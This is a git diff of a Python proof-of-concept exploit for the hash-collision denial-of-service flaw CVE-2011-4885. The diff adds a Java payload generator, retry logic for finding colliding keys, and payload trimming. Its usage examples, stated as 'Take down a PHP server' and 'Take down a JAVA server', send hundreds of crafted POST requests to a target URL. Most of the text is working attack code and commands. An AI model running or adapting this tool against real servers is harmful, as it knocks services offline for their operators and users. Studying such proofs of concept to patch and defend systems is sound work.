@@ -9,6 +9,7 @@ https://github.com/FireFart/HashCollision-DOS-POC
 
 Original PHP Payloadgenerator taken from https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
 CVE : CVE-2011-4885
+http://www.ocert.org/advisories/ocert-2011-003.html
 
 requires Python 2.7
 
@@ -16,10 +17,14 @@ Examples:
 -) Make a single Request, wait for the response and save the response to output0.html
 python HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output -t PHP
 
--) Take down a server(make 500 requests without waiting for a response):
+-) Take down a PHP server(make 500 requests without waiting for a response):
 python HashtablePOC.py -u https://host/index.php -v -c 500 -t PHP
 
+-) Take down a JAVA server(make 500 requests without waiting for a response, maximum POST data size 2MB):
+python HashtablePOC.py -u https://host/index.php -v -c 500 -t JAVA -m 2
+
 Changelog:
+v6.0: Added Javapayloadgenerator
 v5.0: Define max payload size as parameter
 v4.0: Get PHP Collision Chars on the fly
 v3.0: Load Payload from file
@@ -40,7 +45,12 @@ import random
 import itertools
 
 class Payloadgenerator:
-    def __init__(self, collisionchars = 5, collisioncharlength = 2, payloadlength = 8):
+    # Maximum recursions when searching for collisionchars
+    _recursivemax = 15
+    _recursivecounter = 1
+    
+    def __init__(self, verbose, collisionchars = 5, collisioncharlength = 2, payloadlength = 8):
+        self._verbose = verbose
         self._collisionchars = collisionchars
         self._collisioncharlength = collisioncharlength
         self._payloadlength = payloadlength
@@ -59,43 +69,50 @@ class Payloadgenerator:
         return self._generatePayload(a, self._payloadlength);
     
     def _computePHPCollisionChars(self, count):
-        return self._computeCollisionChars(self._DJBX33A, count)
+        charrange = range(0, 256)
+        return self._computeCollisionChars(self._DJBX33A, count, charrange)
     
     def _computeJAVACollisionChars(self, count):
-        return self._computeCollisionChars(self._DJBX31A, count)
+        charrange = range(0, 129)
+        return self._computeCollisionChars(self._DJBX31A, count, charrange)
     
-    def _computeCollisionChars(self, function, count):
+    def _computeCollisionChars(self, function, count, charrange):
         hashes = {}
         counter = 0
         length = self._collisioncharlength
         a = ""
-        for i in range(0, 256):
+        for i in charrange:
             a = a+chr(i)
         source = list(itertools.product(a, repeat=length))
         basestr = ''.join(random.choice(source))
         basehash = function(basestr)
-        print("\tValue: %s\tHash: %s" % (basestr, basehash))
-        for i in basestr:
-            print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
         hashes[str(counter)] = basestr
         counter = counter + 1
         for item in source:
             tempstr = ''.join(item)
             if tempstr == basestr:
                 continue
-    
-            temphash = function(tempstr) 
-            if temphash == basehash:
-                print("\tValue: %s\tHash: %s" % (tempstr, temphash))
-                for i in tempstr:
-                    print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
+            if function(tempstr)  == basehash:
                 hashes[str(counter)] = tempstr
                 counter = counter + 1
             if counter >= count:
                 break;
-        if counter != count:
-            print("Not enough values found. Please start the script again")
-            sys.exit(1)
+        if counter < count:
+            # Try it again
+            if self._recursivecounter > self._recursivemax:
+                print("Not enought values found. Please start this script again")
+                sys.exit(1)
+            print("%d: Not enough values found. Trying it again..." % self._recursivecounter)
+            self._recursivecounter = self._recursivecounter + 1
+            hashes = self._computeCollisionChars(function, count, charrange)
+        else:
+            if self._verbose:
+                print("Found values:")
+                for item in hashes:
+                    tempstr = hashes[item]
+                    print("\tValue: %s\tHash: %s" % (tempstr, function(tempstr)))
+                    for i in tempstr:
+                        print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
         return hashes
     
     def _DJBXA(self, inputstring, base, start):
@@ -138,7 +155,7 @@ class Payloadgenerator:
             result = inputstring.rjust(length, "0")
             for item in collisionchars:
                 result = result.replace(str(item), collisionchars[item])
-            post += "" + urllib.urlencode({result:""}) + "&"
+            post += urllib.urlencode({result:""}) + "&"
     
         return post;
     
@@ -157,7 +174,7 @@ class Payloadgenerator:
         return "".join(arr)
 
 def main():
-    parser = argparse.ArgumentParser(description="Take down a remote PHP Host", prog="PHP Hashtable Exploit")
+    parser = argparse.ArgumentParser(description="Take down a remote Host via Hashcollisions", prog="Universal Hashcollision Exploit")
     parser.add_argument("-u", "--url", dest="url", help="Url to attack", required=True)
     parser.add_argument("-w", "--wait", dest="wait", action="store_true", default=False, help="wait for Response")
     parser.add_argument("-c", "--count", dest="count", type=int, default=1, help="How many requests")
@@ -166,9 +183,9 @@ def main():
     parser.add_argument("-p", "--payload", dest="payload", help="Save payload to file")
     parser.add_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
     parser.add_argument("-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True)
-    parser.add_argument("-m", "--max-payload-size", dest="maxpayloadsize", help="Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB", default=8, type=int)
+    parser.add_argument("-m", "--max-payload-size", dest="maxpayloadsize", help="Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB, Tomcat is 2MB", default=8, type=int)
     parser.add_argument("-g", "--generate", dest="generate", help="Only generate Payload and exit", default=False, action="store_true")
-    parser.add_argument("--version", action="version", version="%(prog)s 5.0")
+    parser.add_argument("--version", action="version", version="%(prog)s 6.0")
 
     options = parser.parse_args()
 
@@ -201,7 +218,7 @@ def main():
         collisioncharlength = 2
         # Length of each parameter in the payload
         payloadlength = 8
-        generator = Payloadgenerator(collisionchars, collisioncharlength, payloadlength)
+        generator = Payloadgenerator(options.verbose, collisionchars, collisioncharlength, payloadlength)
         if options.target == "PHP":
             payload = generator.generatePHPPayload()
         elif options.target == "ASP":
@@ -224,6 +241,9 @@ def main():
     # trim to maximum payload size (in MB)
     maxinmb = options.maxpayloadsize*1024*1024
     payload = payload[:maxinmb]
+    # remove last invalid(cut off) parameter
+    position = payload.rfind("=&")
+    payload = payload[:position+1]
     
     # Save payload
     if options.save:
